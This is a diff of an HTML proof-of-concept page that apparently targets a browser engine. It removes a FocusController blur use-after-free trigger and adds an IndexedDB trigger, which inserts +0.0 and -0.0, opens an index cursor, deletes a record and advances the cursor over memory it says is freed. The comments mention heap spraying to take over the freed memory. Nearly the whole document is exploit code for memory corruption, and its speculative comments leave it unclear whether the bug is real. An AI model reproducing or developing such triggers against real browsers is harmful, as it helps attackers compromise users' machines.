@@ -8,52 +8,80 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 </head>
 <body>
 <div id="log"></div>
-
-<!-- The victim element that will hold focus -->
-<input type="text" id="target" value="Click me, then click outside the window!">
-
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== FOCUSCONTROLLER BLUR USE-AFTER-FREE ===", "info");
-log("[*] Setting up the blur trap...", "info");
+log("=== INDEXEDDB HASH COLLISION USE-AFTER-FREE ===", "info");
+log("[*] Opening database and setting up the trap...", "info");
 
-let input = document.getElementById("target");
+let request = indexedDB.open("UAF_DB_" + Date.now(), 1);
 
-// When the window loses focus, FocusController::dispatchEventsOnWindowAndFocusedElement
-// runs. It grabs the focused element as a RAW POINTER and fires the blur event on it.
-input.addEventListener("blur", () => {
-    log("[!] BLUR EVENT CAUGHT! C++ is holding raw pointers on the stack!", "warn");
-    log("[!] Destroying the document structure...", "hit");
+request.onupgradeneeded = (e) => {
+    let db = e.target.result;
+    // We create an object store and an index to trigger the IDBKeyData hashing
+    let store = db.createObjectStore("store", { keyPath: "id" });
+    store.createIndex("idx", "value");
+    log("[*] Database created with index 'idx'", "info");
+};
+
+request.onsuccess = (e) => {
+    let db = e.target.result;
+    log("[*] Database opened. Starting transaction...", "info");
     
-    // We remove the element from the DOM.
-    // In a real exploit, we might use document.open() or remove the iframe
-    // to completely destroy the Document and Frame objects.
-    input.remove();
-    
-    // Force garbage collection if possible, or spray the heap to overwrite the freed memory.
-    // By the time this function returns, the C++ code will resume and try to fire
-    // the windowEvent using the stale 'document' pointer!
-    
-    log("[*] Returning control to C++. Brace for impact!", "info");
-});
+    let tx = db.transaction("store", "readwrite");
+    let store = tx.objectStore("store");
 
-// We need the user to focus the input, then blur the window (e.g. click the desktop or switch tabs).
-// The vulnerability requires window-level focus changes.
-input.addEventListener("focus", () => {
-    log("[*] Input focused! Now click outside the browser window to trigger the window blur!", "warn");
-});
+    // Insert +0.0 and -0.0
+    // In C++, IDBKeyData operator== says they are EQUAL.
+    // But the Hasher generates DIFFERENT hashes.
+    // This completely breaks the HashMap invariants.
+    log("[!] Inserting +0.0 and -0.0...", "warn");
+    store.put({ id: 1, value: 0.0 });
+    store.put({ id: 2, value: -0.0 });
 
-// Alternative trigger: try to force it programmatically
-setTimeout(() => {
-    try {
-        log("[*] Attempting programmatic trigger...", "info");
-        input.focus();
-        window.blur(); // Sometimes blocked by browsers, but worth a shot!
-    } catch(e) {
-        log("[-] Programmatic trigger failed: " + e.message, "info");
-    }
-}, 2000);
+    tx.oncomplete = () => {
+        log("[*] Insertion complete. Now we break the HashMap...", "info");
+        
+        let tx2 = db.transaction("store", "readwrite");
+        let store2 = tx2.objectStore("store");
+        let index = store2.index("idx");
+
+        // Open a cursor on the index
+        let cursorReq = index.openCursor();
+        let firstCursor = true;
+
+        cursorReq.onsuccess = (event) => {
+            let cursor = event.target.result;
+            if (cursor && firstCursor) {
+                firstCursor = false;
+                log("[!] Cursor opened. Holding reference to the record...", "warn");
+                
+                // Now we delete +0.0. 
+                // Because of the broken HashMap, C++ might find the -0.0 entry 
+                // via operator== and delete THAT entry instead!
+                // But our cursor might still be pointing to it!
+                log("[!] Deleting +0.0 to corrupt the map and free the cursor's target...", "hit");
+                store2.delete(1); // Deletes id:1 which has value:0.0
+                
+                // Wait a moment for the deletion to process, then advance the cursor
+                setTimeout(() => {
+                    log("[*] Advancing cursor over FREED MEMORY...", "hit");
+                    try {
+                        cursor.continue();
+                    } catch(e) {
+                        log("[-] Error: " + e.message, "info");
+                    }
+                }, 100);
+            } else if (cursor) {
+                log("[-] Cursor advanced successfully (No crash? Maybe the allocator got lucky)", "info");
+            }
+        };
+    };
+};
+
+request.onerror = (e) => {
+    log("[-] DB Error: " + e.target.error.message, "warn");
+};
 </script>
 </body>
 </html>
